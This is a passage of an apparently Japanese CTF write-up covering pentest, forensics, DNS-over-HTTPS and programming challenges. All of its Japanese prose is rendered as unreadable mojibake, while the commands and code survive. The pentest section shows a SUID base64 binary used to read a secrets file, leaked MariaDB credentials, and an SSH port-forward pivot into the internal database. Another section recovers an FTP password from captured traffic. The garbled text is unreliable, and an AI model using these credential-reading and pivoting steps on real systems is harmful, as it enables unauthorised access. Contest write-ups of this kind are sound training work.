<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">george@330bb6afc5ef:~$ find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/<span class="built_in">bin</span>/base64</span><br></pre></td></tr></table></figure>

<p>ãªã‚“ã‹çã—ã„ã®ãŒå¼•ã£ã‹ã‹ã£ãŸãªã€‚</p>
<p>base64ã¯ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å¯¾è±¡ã«ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã§ãã‚‹ã®ã§ã€ã“ã‚Œã§ãƒ•ãƒ©ã‚°å¾—ã‚‰ã‚Œã‚‹(ï¼Ÿ)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">george@330bb6afc5ef:~$ /usr/<span class="built_in">bin</span>/base64 secrets.txt</span><br><span class="line">W01hcmlhREIgQWNjZXNzIEluZm9ybWF0aW9uXQpkYl91c2VyCkg0UmliMF85MGxkQjRSRU4K</span><br></pre></td></tr></table></figure>

<p>ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹ã¨â€¦</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[MariaDB Access Information]</span><br><span class="line">db_user</span><br><span class="line">H4Rib0_90ldB4REN</span><br></pre></td></tr></table></figure>

<p>ãã€œ</p>
<hr>
<p>MariaDBã‚’æ¢ã›ã°è‰¯ã•ãã†ã€‚ã—ã‹ã—VPNå‚åŠ ã—ã¦ã„ã‚‹ãƒã‚·ãƒ³ã‹ã‚‰nmapã—ã¦ã‚‚è¦‹ã¤ã‹ã‚‰ãªã„ã€‚</p>
<p>CMSã¯DBã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã‚‹ã¯ãšãªã®ã§ã€Discovery, Exploitã®å•é¡Œã§å…¥ã£ãŸç®¡ç†ç”»é¢ã§infoçš„ãªã¨ã“ã‚ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã€ï¼ˆCMSã‚µãƒ¼ãƒãƒ¼ã«ã¨ã£ã¦ã®ï¼‰ <code>ctfbox_mariadb_1</code> (192.168.32.2ã«è§£æ±ºã•ã‚Œã‚‹) ã¨ã„ã†ãƒ›ã‚¹ãƒˆã‚’ç™ºè¦‹ã€‚</p>
<p>ã“ã“ã«mysqlãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚Œã°ã‚ˆã„ã®ã ãŒã€ <code>mysql</code> ã‚³ãƒãƒ³ãƒ‰ã¯ãªã„ã—ã€ <code>python3</code> ã‚„ã‚‰ <code>perl</code> ã«ã‚‚MySQLãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’å–‹ã‚Œã‚‹ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ãªã„ã€‚</p>
<p>ãƒ’ãƒ³ãƒˆã‚’è¦‹ã‚‹ã€‚</p>
<blockquote>
<p>SSH ã‚µãƒ¼ãƒã‚™ãƒ¼ã¦ã‚™å®Ÿè¡Œã¦ã‚™ãã‚‹ã‚³ãƒãƒ³ãƒˆã‚™ã¯å°‘ãªã„ã¦ã‚™ã™ã‹ã‚™ã€ãƒ›ã‚šãƒ¼ãƒˆãƒ•ã‚©ãƒ¯ãƒ¼ãƒ†ã‚™ã‚£ãƒ³ã‚¯ã‚™ã‚’åˆ©ç”¨ã™ã‚Œã¯ã‚™ã†ã¾ãã„ãã¯ã™ã‚™ã¦ã‚™ã™ã€‚</p>
</blockquote>
<p>ã‚ã‚ã‚ã‚ã‚ãã£ã‹ã‚ã‚ã‚ã‚ã‚ã‚ã‚</p>
<p>ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã†ã‚è¦šãˆã ãŒã€VPNå‚åŠ ã—ã¦ã„ã‚‹æ”»æ’ƒãƒã‚·ãƒ³ã‹ã‚‰ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’æ‰“ã£ã¦æ¥ç¶šã§ããŸã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% ssh -L3307:<span class="number">192.168</span><span class="number">.32</span><span class="number">.2</span>:<span class="number">3306</span> george@<span class="number">10.10</span><span class="number">.10</span><span class="number">.21</span></span><br><span class="line">% mysql -h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -P <span class="number">3307</span> -u db_user --password=H4Rib0_90ldB4REN</span><br></pre></td></tr></table></figure>

<p>ã‚ã¨ã¯ãƒ†ãƒ¼ãƒ–ãƒ«ã¾ã§ãŸã©ã‚Šç€ãã ã‘ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag5              |</span><br><span class="line">| information_schema |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.017</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use flag5</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">MariaDB [flag5]&gt; show tables;</span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_flag5 |</span><br><span class="line">+-----------------+</span><br><span class="line">| flag            |</span><br><span class="line">+-----------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.007</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [flag5]&gt; select * <span class="keyword">from</span> flag;</span><br><span class="line">+----+------------------------+</span><br><span class="line">| <span class="built_in">id</span> | flag                   |</span><br><span class="line">+----+------------------------+</span><br><span class="line">|  <span class="number">1</span> | **flag&#123;p!V071ng_M31s73r&#125;** |</span><br><span class="line">+----+------------------------+</span><br></pre></td></tr></table></figure>

<aside>
â›³ flag{p!V071ng_M31s73r}

</aside>

<h3><span id="fileextract">FileExtract</span></h3><img src="/img/2024/02-25/Untitled%2029.png" width="550px" height="auto">

<p>Wiresharkã®ãƒ•ã‚¡ã‚¤ãƒ«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§FTPã‹ã‚‰ .zip ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã€‚ã ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ä»˜ãzipã€‚<br><a target="_blank" rel="noopener" href="https://laysakura.notion.site/CTF-forensics-bb9a10ec17134b6c86ba5cd91c4f33d1#6096ebfa313b4b56b992cf80e2ecc5ee">ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ä»˜ãzipã®ã‚¯ãƒ©ãƒƒã‚¯ with john - Notion</a> ã§ã‚‚ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ç‰¹å®šã§ããšã€‚</p>
<p>Follow TCP Streams ã§FTPã‚µãƒ¼ãƒãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒè¦‹ãˆã‚‹ã®ã§ã€ãã‚Œã§è©¦ã™ã¨å±•é–‹ã§ããŸã€‚</p>
<aside>
â›³ flag{6qhFJSHAP4A4}

</aside>

<h3><span id="do-the-best-è§£ã‘ãªã‹ã£ãŸ">Do tHe best (è§£ã‘ãªã‹ã£ãŸ ğŸ˜­)</span></h3><p>HTTPãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ã‹ã‚‰ã€<a target="_blank" rel="noopener" href="https://github.com/m13253/dns-over-https">https://github.com/m13253/dns-over-https</a> ãŒãƒ’ãƒ³ãƒˆã§ã‚ã£ã¦ã€DNS over HTTPSã®å•é¡Œã§ã‚ã‚‹ã“ã¨ã¯ã‚ã‹ã£ãŸã€‚ä¾‹ãˆã°ä»¥ä¸‹ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯é€šã‚‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% curl --insecure -H <span class="string">&#x27;accept: application/dns-json&#x27;</span> <span class="string">&#x27;https://10.10.10.20/dns-query?name=example.com&amp;type=A&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;Status&quot;</span>:0,<span class="string">&quot;TC&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;RD&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;RA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;AD&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;CD&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Question&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;example.com.&quot;</span>,<span class="string">&quot;type&quot;</span>:1&#125;],<span class="string">&quot;Authority&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;example.com.&quot;</span>,<span class="string">&quot;type&quot;</span>:6,<span class="string">&quot;TTL&quot;</span>:86400,<span class="string">&quot;Expires&quot;</span>:<span class="string">&quot;Mon, 26 Feb 2024 14:45:17 UTC&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;ns.example.com. hostmaster.examle.com. 2024120101 10800 3600 604800 86400&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>ã—ã‹ã—æ™‚é–“ã‚‚ãªãã“ã‚Œä»¥ä¸Šæ‰‹ãŒå‡ºã›ãšâ€¦</p>
<hr>
<p>é€†å¼•ããŒæ­£è§£ã ã£ãŸæ¨¡æ§˜ã€‚ã†ã‚ãƒ¼Nå¹´å‰ã«digã§ã‚„ã£ãŸã“ã¨ã‚ã‚‹ï¼</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% curl  --insecure -H <span class="string">&#x27;accept: application/dns-json&#x27;</span> <span class="string">&#x27;https://10.10.10.20/dns-query?name=20.10.10.10.in-addr.arpa&amp;type=PTR&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;Status&quot;</span>:0,<span class="string">&quot;TC&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;RD&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;RA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;AD&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;CD&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Question&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;20.10.10.10.in-addr.arpa.&quot;</span>,<span class="string">&quot;type&quot;</span>:12&#125;],<span class="string">&quot;Answer&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;20.10.10.10.in-addr.arpa.&quot;</span>,<span class="string">&quot;type&quot;</span>:12,<span class="string">&quot;TTL&quot;</span>:86400,<span class="string">&quot;Expires&quot;</span>:<span class="string">&quot;Mon, 26 Feb 2024 14:47:09 UTC&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;**DSb-mt8ZVRtTCL97PDL4rRQxc3TbZ-gu.example.com**.&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—ã‚‰ã‚ŒãŸãƒ›ã‚¹ãƒˆã‚’æŒ‡å®šã—ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ãƒ•ãƒ©ã‚°ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">% curl --insecure -H <span class="string">&#x27;Host: DSb-mt8ZVRtTCL97PDL4rRQxc3TbZ-gu.example.com&#x27;</span> https://10.10.10.20</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;DO tHe best&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html &#123; color-scheme: light dark; &#125;</span><br><span class="line">body &#123; width: 35em; margin: 0 auto;</span><br><span class="line">font-family: Tahoma, Verdana, Arial, sans-serif; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;h1&gt;**flag&#123;8NZfrhDH-ZGe&#125;**&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<aside>
â›³ flag{8NZfrhDH-ZGe}

</aside>

<p>ã“ã‚Œã¯æ™‚é–“ã‹ã‘ãŸã‚‰è§£ã‘ãŸã‹ã‚‚ãªâ€¦</p>
<h2><span id="programming">Programming</span></h2><p>å¤§ä½“CopilotãŒã‚„ã‚Šã¾ã—ãŸ</p>
<h3><span id="logistic-map">Logistic Map</span></h3><img src="/img/2024/02-25/Untitled%2030.png" width="550px" height="auto">

<p>Copilotã«ä»¥ä¸‹ã®ãŠé¡˜ã„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹è¨˜ã®ãƒ­ã‚·ã‚™ã‚¹ãƒ†ã‚£ãƒƒã‚¯å†™åƒã«ã¤ã„ã¦ã€x_0 = 0.3 ã‚’ä¸ãˆãŸæ™‚ã® x_9999 ã®å€¤ã‚’æ±‚ã‚ã€å°æ•°ç¬¬7ä½ã¾ã¦ã‚™ã®å€¤ã‚’ç­”ãˆã¦ããŸã‚™ã•ã„ã€‚ãªãŠã€å€¤ã®ä¿æŒã¨è¨ˆç®—ã«ã¯å€ç²¾åº¦æµ®å‹•å°æ•°ç‚¹æ•°ã‚’ä½¿ç”¨ã—ã¦ããŸã‚™ã•ã„ã€‚</span><br><span class="line"></span><br><span class="line">x_&#123;n+1&#125; = 3.99 x_n (1 - x_n)</span><br></pre></td></tr></table></figure>

<p>ã“ã‚“ãªã‚³ãƒ¼ãƒ‰ã‚’åã„ãŸã€‚ä¸€ç™ºæˆåŠŸã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">logistic_map</span>(<span class="params">x0, r, n</span>):</span><br><span class="line">    x = x0</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        x = r * x * (<span class="number">1</span> - x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">x0 = <span class="number">0.3</span></span><br><span class="line">r = <span class="number">3.99</span></span><br><span class="line">n = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">result = logistic_map(x0, r, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;The value of x_<span class="subst">&#123;n&#125;</span>: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% python solve.py</span><br><span class="line">The value of x_9999: <span class="number">0.8112735079776592</span></span><br></pre></td></tr></table></figure>

<aside>
â›³ flag{0.8112735}

</aside>

<h3><span id="randomness-extraction">Randomness Extraction</span></h3><img src="/img/2024/02-25/Untitled%2031.png" width="550px" height="auto">

<p>ã‚°ã‚°ã£ã¦ &lt;<a target="_blank" rel="noopener" href="https://github.com/MayankKharbanda/randomness_extractors/blob/master/neumann/von_neumann.py">https://github.com/MayankKharbanda/randomness_extractors/blob/master/neumann/von_neumann.py</a> ã‚’ç™ºè¦‹ã€‚</p>
<p>ã“ã„ã¤ã‚’å®Ÿè¡Œã™ã‚‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% python3 von_neumann.py -i random.dat <span class="comment"># output.bin ãŒã§ãã‚‹</span></span><br><span class="line">% file output.bin</span><br><span class="line">output.bin: data</span><br></pre></td></tr></table></figure>

<p>å¾—ä½“ãŒçŸ¥ã‚Œãªã„ã®ã§ãƒã‚¤ãƒŠãƒªã‚’çœºã‚ã‚‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% xxd output.bin</span><br></pre></td></tr></table></figure>

<img src="/img/2024/02-25/Untitled%2032.png" width="auto" height="auto">

<p>ãŸã¾ãŸã¾ãƒ•ãƒ©ã‚°ãŒç›®ã«ã¤ã„ãŸã€‚å†´ãˆã¦ãŸã€‚</p>
<aside>
â›³ flag{3TcPs8QFcX}

</aside>

<h3><span id="xml-confectioner">XML Confectioner</span></h3><img src="/img/2024/02-25/Untitled%2033.png" width="550px" height="auto">

<p>Copilotãƒ‹ã‚­ã®å‡ºç•ªã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">æ·»ä»˜ã® sweets.xml ã«ã¯ã€å¤šæ•°ã® sweets:batch è¦ç´ ã‹ã‚™å«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ä¸­ã‹ã‚‰ã€ä¸‹è¨˜ã®æ¡ä»¶ã™ã¸ã‚™ã¦ã‚’æº€ãŸã™ sweets:batch è¦ç´ å†…ã«ãŠã„ã¦ã€æœ€ã‚‚ cookie:radius å±æ€§ã‹ã‚™å¤§ããª sweets:cookie è¦ç´ ã®å†…å®¹ã‚’æ¢ã—ã¦<span class="built_in">print</span>ã—ã¦ããŸã‚™ã•ã„ã€‚</span><br><span class="line"></span><br><span class="line">1. å°‘ãªãã¨ã‚‚äºŒã¤ã®å­è¦ç´  sweets:icecream ã‹ã‚™å«ã¾ã‚Œã‚‹</span><br><span class="line">2. å­è¦ç´  sweets:icecream ã«ã¯ icecream:amount å±æ€§ã®å€¤ã‹ã‚™ 105g ã‚’ä¸‹å›ã‚‹ã‚‚ã®ã‹ã‚™ãªã„</span><br><span class="line">3. å­è¦ç´  sweets:candy ã® candy:weight å±æ€§ã®å€¤ã®åˆè¨ˆã‹ã‚™ 28.0g ä»¥ä¸Šã¦ã‚™ã‚ã‚‹</span><br><span class="line">4. å­è¦ç´  sweets:candy ã® candy:shape å±æ€§ã‹ã‚™ 5 ç¨®é¡ä»¥ä¸Šå«ã¾ã‚Œã‚‹</span><br><span class="line">5. cookie:kind å±æ€§ã‹ã‚™ icing ã¦ã‚™ã‚ã‚Šã‹ã¤ cookie:radius å±æ€§ã‹ã‚™ 3.0cm ä»¥ä¸Šã®å­è¦ç´  sweets:cookie ã‚’å°‘ãªãã¨ã‚‚ä¸€ã¤å«ã‚€</span><br><span class="line"></span><br><span class="line">ä»¥ä¸‹ãŒ sweets.xml ã®å†’é ­éƒ¨åˆ†ã§ã™ã€‚</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&#x27;1.0&#x27;</span> encoding=<span class="string">&#x27;utf-8&#x27;</span>?&gt;</span><br><span class="line">&lt;sweets:orders xmlns:icecream=<span class="string">&quot;&lt;http://xml.vlc-cybercontest.com/icecream&gt;&quot;</span></span><br><span class="line">    xmlns:candy=<span class="string">&quot;&lt;http://xml.vlc-cybercontest.com/candy&gt;&quot;</span></span><br><span class="line">    xmlns:cookie=<span class="string">&quot;&lt;http://xml.vlc-cybercontest.com/cookie&gt;&quot;</span></span><br><span class="line">    xmlns:sweets=<span class="string">&quot;&lt;http://xml.vlc-cybercontest.com/sweets&quot;</span>&gt;&gt;</span><br><span class="line">    &lt;sweets:batch sweets:<span class="built_in">id</span>=<span class="string">&quot;0x1E24A4AE&quot;</span>&gt;</span><br><span class="line">        &lt;sweets:icecream icecream:<span class="built_in">id</span>=<span class="string">&quot;0x9F78027&quot;</span> icecream:flavor=<span class="string">&quot;strawberry&quot;</span> icecream:amount=<span class="string">&quot;94.1164575g&quot;</span> icecream:shape=<span class="string">&quot;sphere&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:icecream icecream:<span class="built_in">id</span>=<span class="string">&quot;0xB9F4B823&quot;</span> icecream:flavor=<span class="string">&quot;strawberry&quot;</span> icecream:amount=<span class="string">&quot;91.8668061g&quot;</span> icecream:shape=<span class="string">&quot;sphere&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:candy candy:<span class="built_in">id</span>=<span class="string">&quot;0x8C55D4CE&quot;</span> candy:kind=<span class="string">&quot;coffee&quot;</span> candy:weight=<span class="string">&quot;3.9366492g&quot;</span> candy:shape=<span class="string">&quot;tetrahedron&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:candy candy:<span class="built_in">id</span>=<span class="string">&quot;0x9D8BBA94&quot;</span> candy:kind=<span class="string">&quot;soda&quot;</span> candy:weight=<span class="string">&quot;3.7906460g&quot;</span> candy:shape=<span class="string">&quot;octahedron&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:candy candy:<span class="built_in">id</span>=<span class="string">&quot;0xB81F4174&quot;</span> candy:kind=<span class="string">&quot;coffee&quot;</span> candy:weight=<span class="string">&quot;3.3636170g&quot;</span> candy:shape=<span class="string">&quot;sphere&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:cookie cookie:<span class="built_in">id</span>=<span class="string">&quot;0xFB7C6DE7&quot;</span> cookie:kind=<span class="string">&quot;checker&quot;</span> cookie:radius=<span class="string">&quot;3.2564663cm&quot;</span>&gt;flag&#123;TkzPn3ZKL28zJXn7&#125;&lt;/sweets:cookie&gt;</span><br><span class="line">        &lt;sweets:cookie cookie:<span class="built_in">id</span>=<span class="string">&quot;0x26C3166A&quot;</span> cookie:kind=<span class="string">&quot;icing&quot;</span> cookie:radius=<span class="string">&quot;3.0929699cm&quot;</span>&gt;flag&#123;MbfkAZTVpc6bMrz9&#125;&lt;/sweets:cookie&gt;</span><br><span class="line">    &lt;/sweets:batch&gt;</span><br></pre></td></tr></table></figure>

<p>å‰²ã¨è‰¯ã„ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ã„ã¦ãã‚ŒãŸã®ã ãŒã€namespaceã®éƒ¨åˆ†ãŒæ­£ã—ããªã‹ã£ãŸã®ã§æ‰‹ä¿®æ­£ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import xml.etree.ElementTree as ET</span></span><br><span class="line"><span class="keyword">import</span> lxml.etree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_sweets</span>(<span class="params">file</span>):</span><br><span class="line">    tree = ET.parse(file)</span><br><span class="line">    root = tree.getroot()</span><br><span class="line"></span><br><span class="line">    max_radius = <span class="number">0</span></span><br><span class="line">    max_cookie = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> batch <span class="keyword">in</span> root.findall(<span class="string">&quot;.//sweets:batch&quot;</span>, root.nsmap):</span><br><span class="line">        icecreams = batch.findall(<span class="string">&quot;.//sweets:icecream&quot;</span>, root.nsmap)</span><br><span class="line">        candies = batch.findall(<span class="string">&quot;.//sweets:candy&quot;</span>, root.nsmap)</span><br><span class="line">        cookies = batch.findall(<span class="string">&quot;.//sweets:cookie&quot;</span>, root.nsmap)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. å°‘ãªãã¨ã‚‚äºŒã¤ã®å­è¦ç´  sweets:icecream ã‹ã‚™å«ã¾ã‚Œã‚‹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(icecreams) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. å­è¦ç´  sweets:icecream ã«ã¯ icecream:amount å±æ€§ã®å€¤ã‹ã‚™ 105g ã‚’ä¸‹å›ã‚‹ã‚‚ã®ã‹ã‚™ãªã„</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(</span><br><span class="line">            <span class="built_in">float</span>(</span><br><span class="line">                ic.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/icecream&#125;amount&quot;</span>).rstrip(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">            &lt; <span class="number">105</span></span><br><span class="line">            <span class="keyword">for</span> ic <span class="keyword">in</span> icecreams</span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. å­è¦ç´  sweets:candy ã® candy:weight å±æ€§ã®å€¤ã®åˆè¨ˆã‹ã‚™ 28.0g ä»¥ä¸Šã¦ã‚™ã‚ã‚‹</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="built_in">sum</span>(</span><br><span class="line">                <span class="built_in">float</span>(</span><br><span class="line">                    c.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/candy&#125;weight&quot;</span>).rstrip(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> candies</span><br><span class="line">            )</span><br><span class="line">            &lt; <span class="number">28.0</span></span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. å­è¦ç´  sweets:candy ã® candy:shape å±æ€§ã‹ã‚™ 5 ç¨®é¡ä»¥ä¸Šå«ã¾ã‚Œã‚‹</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="built_in">len</span>(</span><br><span class="line">                <span class="built_in">set</span>(</span><br><span class="line">                    c.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/candy&#125;shape&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> c <span class="keyword">in</span> candies</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            &lt; <span class="number">5</span></span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span 